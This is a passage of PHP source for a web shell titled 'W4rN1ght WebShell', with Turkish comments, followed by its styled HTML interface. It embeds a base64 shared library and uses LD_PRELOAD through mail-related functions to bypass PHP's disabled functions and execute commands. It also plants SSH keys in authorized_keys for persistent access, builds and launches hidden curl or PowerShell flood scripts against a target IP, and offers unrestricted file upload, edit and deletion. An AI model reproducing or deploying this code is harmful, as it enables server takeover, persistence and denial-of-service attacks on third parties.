IDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdABmb3JrQEBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJ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';

        file_put_contents('chankro.so', $chankro);
        file_put_contents('acpid.socket', $cmd);
        putenv('CHANKRO=' . realpath('acpid.socket'));
        putenv('LD_PRELOAD=' . realpath('chankro.so'));
        @mail('a', 'a', 'a', 'a');
        if(file_exists('test.txt')) {
            $results['mail'] = file_get_contents('test.txt');
            @unlink('test.txt');
        }
        @unlink('chankro.so');
        @unlink('acpid.socket');
    }
    if(function_exists('mb_send_mail') && function_exists('putenv')) {
        file_put_contents('chankro.so', $chankro);
        file_put_contents('acpid.socket', $cmd);
        putenv('CHANKRO=' . realpath('acpid.socket'));
        putenv('LD_PRELOAD=' . realpath('chankro.so'));
        @mb_send_mail('a', 'a', 'a', 'a');
        if(file_exists('test.txt')) {
            $results['mb_send_mail'] = file_get_contents('test.txt');
            @unlink('test.txt');
        }
        @unlink('chankro.so');
        @unlink('acpid.socket');
    }
    if(function_exists('error_log') && function_exists('putenv')) {
        file_put_contents('chankro.so', $chankro);
        file_put_contents('acpid.socket', $cmd);
        putenv('CHANKRO=' . realpath('acpid.socket'));
        putenv('LD_PRELOAD=' . realpath('chankro.so'));
        @error_log('a', 1, 'a@a.com');
        if(file_exists('test.txt')) {
            $results['error_log'] = file_get_contents('test.txt');
            @unlink('test.txt');
        }
        @unlink('chankro.so');
        @unlink('acpid.socket');
    }
    if(function_exists('imap_mail') && function_exists('putenv')) {
        file_put_contents('chankro.so', $chankro);
        file_put_contents('acpid.socket', $cmd);
        putenv('CHANKRO=' . realpath('acpid.socket'));
        putenv('LD_PRELOAD=' . realpath('chankro.so'));
        @imap_mail('a', 'a', 'a');
        if(file_exists('test.txt')) {
            $results['imap_mail'] = file_get_contents('test.txt');
            @unlink('test.txt');
        }
        @unlink('chankro.so');
        @unlink('acpid.socket');
    }
    return $results;
}
function ssh_create_key($username, $key_type = 'rsa', $bits = 4096) {
    $ssh_dir = '/home/' . $username . '/.ssh';
    if(!is_dir($ssh_dir)) {
        mkdir($ssh_dir, 0700, true);
    }
    $key_file = $ssh_dir . '/id_' . $key_type;
    $pub_file = $key_file . '.pub';
    if($key_type == 'rsa') {
        execute_command("ssh-keygen -t rsa -b $bits -f $key_file -N '' -q");
    } elseif($key_type == 'ed25519') {
        execute_command("ssh-keygen -t ed25519 -f $key_file -N '' -q");
    } elseif($key_type == 'ecdsa') {
        execute_command("ssh-keygen -t ecdsa -b 521 -f $key_file -N '' -q");
    }
    if(file_exists($pub_file)) {
        $pub_key = file_get_contents($pub_file);
        file_put_contents($ssh_dir . '/authorized_keys', $pub_key . "\n", FILE_APPEND);
        chmod($ssh_dir . '/authorized_keys', 0600);
        return array('private' => $key_file, 'public' => $pub_key);
    }
    return false;
}
function internal_dos_flood($target_ip, $duration = 60, $threads = 50) {
    $pid_file = '/tmp/dos_' . md5($target_ip) . '.pid';
    if(!$GLOBALS['is_windows']) {
        $script = "#!/bin/bash\n";
        $script .= "end=\$((SECONDS+$duration))\n";
        $script .= "while [ \$SECONDS -lt \$end ]; do\n";
        for($i=0; $i<$threads; $i++) {
            $script .= "  curl -s -k -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' 'https://$target_ip' --insecure --retry 0 --connect-timeout 1 --max-time 2 > /dev/null 2>&1 &\n";
        }
        $script .= "  wait\n";
        $script .= "done\n";
        file_put_contents('/tmp/dos_' . md5($target_ip) . '.sh', $script);
        execute_command("chmod +x /tmp/dos_" . md5($target_ip) . ".sh");
        execute_command("nohup /tmp/dos_" . md5($target_ip) . ".sh > /dev/null 2>&1 & echo $! > $pid_file");
        return true;
    } else {
        $ps_script = "while(\$true) { for(\$i=0; \$i -lt $threads; \$i++) { Start-Job -ScriptBlock { Invoke-WebRequest -Uri 'https://$target_ip' -UseBasicParsing -TimeoutSec 1 } } Start-Sleep -Milliseconds 100 }";
        file_put_contents('C:\\Windows\\Temp\\dos.ps1', $ps_script);
        execute_command("powershell -WindowStyle Hidden -File C:\\Windows\\Temp\\dos.ps1");
        return true;
    }
}


function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}

function x($b) {
    return base64_encode($b);
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = str_replace('\\', '/', $current_dir);
if(substr($current_dir, -1) != '/') $current_dir .= '/';

$currentDirectory = realpath($current_dir);
if ($currentDirectory) {
    chdir($currentDirectory);
    $currentDirectory = getcwd() . '/';
    $currentDirectory = str_replace('\\', '/', $currentDirectory);
} else {
    $currentDirectory = getcwd() . '/';
}

$message = '';
$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // DOSYA YÜKLEME
    if (isset($_FILES['upload_file'])) {
        $target_file = $currentDirectory . basename($_FILES["upload_filae"]["name"]);
        if (move_uploaded_file($_FILES["upload_file"]["tmp_name"], $target_file)) {
            $message = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Dosya yüklendi: ' . htmlspecialchars(basename($_FILES["upload_file"]["name"])) . '</div>';
        } else {
            $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Dosya yüklenemedi!</div>';
        }
    }
    
    // KLASÖR OLUŞTURMA
    elseif (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
        $folder = $_POST['new_folder'];
        $newFolder = $currentDirectory . $folder;
        if (!file_exists($newFolder)) {
            if (mkdir($newFolder, 0755)) {
                $message = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Klasör oluşturuldu: ' . htmlspecialchars($folder) . '</div>';
            } else {
                $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Klasör oluşturulamadı!</div>';
            }
        } else {
            $message = '<div class="alert alert-warning"><i class="bi bi-exclamation-circle"></i> Klasör zaten var: ' . htmlspecialchars($folder) . '</div>';
        }
    }
    
    // DOSYA OLUŞTURMA
    elseif (isset($_POST['new_file'])) {
        $fileName = $_POST['new_file'];
        $newFile = $currentDirectory . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, '') !== false) {
                $message = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Dosya oluşturuldu: ' . htmlspecialchars($fileName) . '</div>';
                $fileContent = '';
                if (file_exists($newFile)) {
                    $fileContent = file_get_contents($newFile);
                    $viewCommandResult = '<hr><p>Dosya: ' . htmlspecialchars($fileName) . '</p>
                    <form method="post" action="?dir=' . urlencode($current_dir) . '">
                    <textarea name="content" class="result-box" rows="15">' . htmlspecialchars($fileContent) . '</textarea>
                    <input type="hidden" name="save_file" value="' . htmlspecialchars($fileName) . '">
                    <button type="submit" class="btn btn-primary mt-10"><i class="bi bi-save"></i> Kaydet</button>
                    </form>';
                }
            } else {
                $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Dosya oluşturulamadı!</div>';
            }
        } else {
            $message = '<div class="alert alert-warning"><i class="bi bi-exclamation-circle"></i> Dosya zaten var: ' . htmlspecialchars($fileName) . '</div>';
        }
    }
    
    // DOSYA SİLME
    elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    $message = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Klasör silindi: ' . htmlspecialchars($_POST['delete_file']) . '</div>';
                } else {
                    $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Klasör silinemedi!</div>';
                }
            } else {
                if (unlink($fileToDelete)) {
                    $message = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Dosya silindi: ' . htmlspecialchars($_POST['delete_file']) . '</div>';
                } else {
                    $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Dosya silinemedi!</div>';
                }
            }
        } else {
            $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Dosya bulunamadı!</div>';
        }
    }
    
    // YENİDEN ADLANDIRMA
    elseif (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
        $oldName = $currentDirectory . $_POST['rename_old'];
        $newName = $currentDirectory . $_POST['rename_new'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                $message = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Yeniden adlandırıldı: ' . htmlspecialchars($_POST['rename_old']) . ' → ' . htmlspecialchars($_POST['rename_new']) . '</div>';
            } else {
                $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Yeniden adlandırılamadı!</div>';
            }
        } else {
            $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Dosya bulunamadı!</div>';
        }
    }
    
    // DOSYA GÖRÜNTÜLEME
    elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . $_POST['view_file'];
        if (file_exists($fileToView) && is_file($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Dosya: ' . htmlspecialchars($_POST['view_file']) . '</p>
            <form method="post" action="?dir=' . urlencode($current_dir) . '">
            <textarea name="content" class="result-box" rows="15">' . htmlspecialchars($fileContent) . '</textarea>
            <input type="hidden" name="save_file" value="' . htmlspecialchars($_POST['view_file']) . '">
            <button type="submit" class="btn btn-primary mt-10"><i class="bi bi-save"></i> Kaydet</button>
            </form>';
        } else {
            $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Dosya bulunamadı!</div>';
        }
    }
    
    // DOSYA KAYDETME (DÜZENLEME)
    elseif (isset($_POST['save_file']) && isset($_POST['content'])) {
        $saveFile = $currentDirectory . $_POST['save_file'];
        if (file_put_contents($saveFile, $_POST['content']) !== false) {
            $message = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Dosya kaydedildi: ' . htmlspecialchars($_POST['save_file']) . '</div>';
        } else {
            $message = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Dosya kaydedilemedi!</div>';
        }
    }
}

// HTML KISMINDA MESAJI GÖSTER
// <div class="container"> başlangıcından hemen sonra:
$action = isset($_GET['action']) ? $_GET['action'] : 'dashboard';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>W4rN1ght WebShell</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;line-height:1.6;min-height:100vh;background-image:radial-gradient(circle at 30% 10%,rgba(156,39,176,0.15) 0%,transparent 30%),radial-gradient(circle at 80% 90%,rgba(106,27,154,0.15) 0%,transparent 30%)}::-webkit-scrollbar{width:10px;height:10px}::-webkit-scrollbar-track{background:#1a1a24}::-webkit-scrollbar-thumb{background:#6a1b9a;border-radius:5px}::-webkit-scrollbar-thumb:hover{background:#9c27b0}.navbar{background:linear-gradient(135deg,#0f0f17 0%,#1a1a2a 100%);border-bottom:2px solid #9c27b0;padding:15px 20px;position:sticky;top:0;z-index:1000;box-shadow:0 4px 20px rgba(156,39,176,.3)}.navbar-container{max-width:1600px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}.navbar-brand{color:#9c27b0;font-size:24px;font-weight:700;text-decoration:none;text-shadow:0 0 10px #6a1b9a;display:flex;align-items:center;gap:10px}.navbar-brand img{width:40px;height:40px;border-radius:50%;border:2px solid #9c27b0;object-fit:cover}.navbar-menu{display:flex;gap:5px;flex-wrap:wrap}.nav-item{color:#e0e0e0;text-decoration:none;padding:8px 15px;border-radius:8px;transition:all .3s;font-size:14px;display:flex;align-items:center;gap:5px}.nav-item i{font-size:16px}.nav-item:hover{background:#6a1b9a;color:#fff;box-shadow:0 0 15px #6a1b9a}.nav-item.active{background:#4a148c;color:#fff;border-left:3px solid #9c27b0}.dropdown{position:relative;display:inline-block}.dropdown-content{display:none;position:absolute;background:#1a1a24;min-width:300px;box-shadow:0 8px 16px rgba(156,39,176,.3);border:1px solid #9c27b0;border-radius:8px;z-index:1;top:100%;right:0;max-height:400px;overflow-y:auto}.dropdown:hover .dropdown-content{display:block}.dropdown-content a{color:#e0e0e0;padding:12px 16px;text-decoration:none;display:flex;align-items:center;gap:10px;transition:all .3s;border-bottom:1px solid #2a2a35}.dropdown-content a i{width:20px;color:#9c27b0}.dropdown-content a:hover{background:#6a1b9a}.container{max-width:1600px;margin:20px auto;padding:0 20px}.card{background:#12121a;border:2px solid #6a1b9a;border-radius:15px;margin-bottom:25px;overflow:hidden;box-shadow:0 4px 20px rgba(106,27,154,.2)}.card-header{background:linear-gradient(90deg,#2a1a35,#1a1a2a);color:#e0e0e0;font-weight:700;padding:15px 20px;border-bottom:2px solid #6a1b9a;font-size:18px;display:flex;justify-content:space-between;align-items:center}.card-header i{margin-right:8px;color:#9c27b0}.card-body{padding:20px;background:#12121a}.dashboard-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px;margin-top:20px}.dashboard-item{background:#1a1a24;border:2px solid #6a1b9a;border-radius:12px;padding:25px 20px;text-align:center;transition:all .3s;cursor:pointer}.dashboard-item:hover{transform:translateY(-5px);box-shadow:0 10px 25px rgba(156,39,176,.4);border-color:#9c27b0}.dashboard-item i{font-size:48px;color:#9c27b0;margin-bottom:15px;display:block}.dashboard-item h3{color:#ce93d8;margin-bottom:10px}.dashboard-item p{color:#7e57c2;font-size:13px}.table{width:100%;border-collapse:collapse;color:#e0e0e0}.table th{background:#2a1a35;padding:12px;text-align:left;border-bottom:2px solid #6a1b9a}.table td{padding:10px 12px;border-bottom:1px solid #2a2a35}.table tr:hover{background:#1e1e2a}.form-group{margin-bottom:15px}.form-control{width:100%;padding:10px 15px;background:#1a1a24;border:2px solid #6a1b9a;border-radius:8px;color:#e0e0e0;font-size:14px;transition:all .3s}.form-control:focus{outline:0;border-color:#9c27b0;box-shadow:0 0 10px rgba(156,39,176,.3);background:#22222f}textarea.form-control{resize:vertical;min-height:100px}.btn{display:inline-block;padding:10px 20px;border:0;border-radius:8px;cursor:pointer;font-size:14px;font-weight:700;transition:all .3s;margin-right:5px;margin-bottom:5px;display:inline-flex;align-items:center;gap:5px}.btn i{font-size:16px}.btn-primary{background:linear-gradient(45deg,#6a1b9a,#4a148c);color:#fff}.btn-primary:hover{background:linear-gradient(45deg,#4a148c,#6a1b9a);box-shadow:0 0 15px #6a1b9a}.btn-success{background:linear-gradient(45deg,#2e7d32,#1b5e20);color:#fff}.btn-danger{background:linear-gradient(45deg,#c62828,#8e0000);color:#fff}.btn-warning{background:linear-gradient(45deg,#ff8f00,#ff6f00);color:#fff}.btn-info{background:linear-gradient(45deg,#1565c0,#0d47a1);color:#fff}.btn-sm{padding:5px 10px;font-size:12px}.btn-group{display:flex;gap:5px;flex-wrap:wrap}.path-breadcrumb{background:#1a1a24;padding:15px 20px;border-radius:50px;border:2px solid #6a1b9a;margin:20px 0;word-break:break-all}.path-breadcrumb a{color:#9c27b0;text-decoration:none;transition:all .3s}.path-breadcrumb a:hover{color:#ce93d8;text-shadow:0 0 8px #6a1b9a}.badge-on{background:#1b5e20;color:#fff;padding:3px 8px;border-radius:20px;font-size:11px;font-weight:700}.badge-off{background:#b71c1c;color:#fff;padding:3px 8px;border-radius:20px;font-size:11px;font-weight:700}.badge-info{background:#0d47a1;color:#fff;padding:3px 8px;border-radius:20px;font-size:11px;font-weight:700}.alert{padding:15px 20px;border-radius:10px;margin-bottom:20px;border-left:5px solid;display:flex;align-items:center;gap:10px}.alert i{font-size:20px}.alert-success{background:#1a2a1a;border-left-color:#2e7d32;color:#a5d6a7}.alert-danger{background:#2a1a1a;border-left-color:#c62828;color:#ef9a9a}.alert-warning{background:#2a2a1a;border-left-color:#ff8f00;color:#ffe082}.alert-info{background:#1a1a2a;border-left-color:#1565c0;color:#90caf9}.terminal{background:#0a0a0f;padding:15px;border-radius:8px;border:2px solid #6a1b9a;font-family:'Courier New',monospace;color:#9c27b0;overflow-x:auto;margin-top:15px;max-height:400px;overflow-y:auto}.terminal pre{color:#ce93d8;margin:0;white-space:pre-wrap}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,.98);z-index:2000;justify-content:center;align-items:center}.modal.active{display:flex}.modal-content{background:#12121a;border:2px solid #9c27b0;border-radius:15px;max-width:900px;width:95%;max-height:85vh;overflow-y:auto}.modal-header{padding:15px 20px;border-bottom:2px solid #9c27b0;background:#1a1a24;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}.modal-close{background:0 0;border:0;color:#e0e0e0;font-size:28px;cursor:pointer}.modal-body{padding:20px}.loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(156,39,176,.3);border-radius:50%;border-top-color:#9c27b0;animation:spin 1s ease-in-out infinite}@keyframes spin{to{transform:rotate(360deg)}}.progress{width:100%;height:20px;background:#1a1a24;border-radius:10px;overflow:hidden;margin:10px 0}.progress-bar{height:100%;background:linear-gradient(90deg,#6a1b9a,#9c27b0);transition:width .3s;border-radius:10px}.grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px}.grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}.text-muted{color:#5e35b1;font-size:12px;margin-top:5px}.text-center{text-align:center}.mt-10{margin-top:10px}.mt-20{margin-top:20px}.mb-10{margin-bottom:10px}.mb-20{margin-bottom:20px}.float-right{float:right}@media (max-width:768px){.navbar-menu{margin-top:15px;width:100%}.dashboard-grid{grid-template-columns:1fr}.grid-2,.grid-3{grid-template-columns:1fr}}
    </style>
    <script>
    if (localStorage.getItem('babeStatus') === 'visible') {
        document.documentElement.classList.add('babes-active');
    }
</script>
<style>
    .babe-img { display: none; }
    .babes-active .babe-img { display: block !important; }
</style>
</head>
<body>
<div class="navbar">
    <div class="navbar-container">
        <a href="?action=dashboard" class="navbar-brand">
            <img src="https://images2.alphacoders.com/660/thumb-1920-660058.jpg" alt="Logo">

<button id="toggleBabes" class="btn btn-success" onclick="toggleImages()" style="margin:10px;z-index:10001;position:relative;">
    <i class="bi bi-eye"></i> Bebekleri Göster/Gizle
</button>

<script>
function toggleImages() {
    const html = document.documentElement;
    const btn = document.getElementById('toggleBabes');
    
    if (html.classList.contains('babes-active')) {
        html.classList.remove('babes-active');
        localStorage.setItem('babeStatus', 'hidden');
        btn.className = 'btn btn-success';
    } else {
        html.classList.add('babes-active');
        localStorage.setItem('babeStatus', 'visible');
        btn.className = 'btn btn-danger';
    }
}
window.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('toggleBabes');
    if (document.documentElement.classList.contains('babes-active')) {
        btn.className = 'btn btn-danger';
    }
});
</script>
<img src="https://media.discordapp.net/attachments/1468217900245586163/1478074125141409968/indir.png?ex=69a7134c&is=69a5c1cc&hm=0d9be01df4c2b4066995de99c1fb387dded9840ce50d7c2df7679b172a6a3c42&=&format=webp&quality=lossless&width=387&height=514" class="babe-img" style="position:fixed;bottom:0;left:0;width:280px;height:auto;max-height:85vh;object-fit:contain;z-index:9999;border:none;border-radius:0;margin:0;padding:0;pointer-events:none;background:transparent;filter:contrast(160%) brightness(110%);">

<img src="https://media.discordapp.net/attachments/1468217900245586163/1478075959541497997/melek.png?ex=69a71502&is=69a5c382&hm=49db2e51448dde1f9dbb0b448161349c00705ed5cfad9b18d3bce561c5c2c598&=&format=webp&quality=lossless&width=362&height=514" class="babe-img" style="position:fixed;bottom:0;right:0;width:280px;height:auto;max-height:85vh;object-fit:contain;z-index:9999;border:none;border-radius:0;margin:0;padding:0;pointer-events:none;background:transparent;filter:contrast(170%) brightness(85%);">
     W4rN1ght WebShell
